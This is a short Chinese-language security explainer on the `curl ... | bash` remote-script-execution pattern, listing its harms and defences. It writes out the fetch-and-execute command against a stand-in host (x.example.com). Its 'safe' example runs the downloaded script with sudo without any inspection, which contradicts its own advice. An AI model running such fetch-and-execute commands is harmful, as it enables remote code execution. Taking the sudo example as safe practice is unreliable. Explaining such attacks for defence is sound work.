执行 `curl http://x.example.com/payload.sh | bash` 是一种通过远程获取脚本并立即执行的攻击模式，常见于供应链攻击（如 SolarWinds、Log4Shell）或提权攻击（如通过漏洞执行远程代码）。  

### 危害
- **远程代码执行（RCE）**：攻击者可执行任意命令，破坏系统或窃取数据。  
- **权限提升**：若以高权限运行，可控制整个系统。  
- **隐蔽性**：通过合法协议（HTTP）伪装，易绕过检测。  

### 防御
1. **禁止直接执行远程脚本**：不使用 `| bash` 或 `source` 执行未经验证的远程内容。  
2. **验证来源**：仅执行来自可信源的脚本，且需人工确认。  
3. **启用日志与监控**：追踪执行的远程命令，检测异常行为。  
4. **最小权限原则**：避免以高权限运行用户输入的命令。  

### 示例（安全做法）
```bash
# 安全：先保存脚本再执行
curl http://x.example.com/payload.sh > payload.sh
chmod +x payload.sh
sudo ./payload.sh  # 仅在绝对信任时使用
```
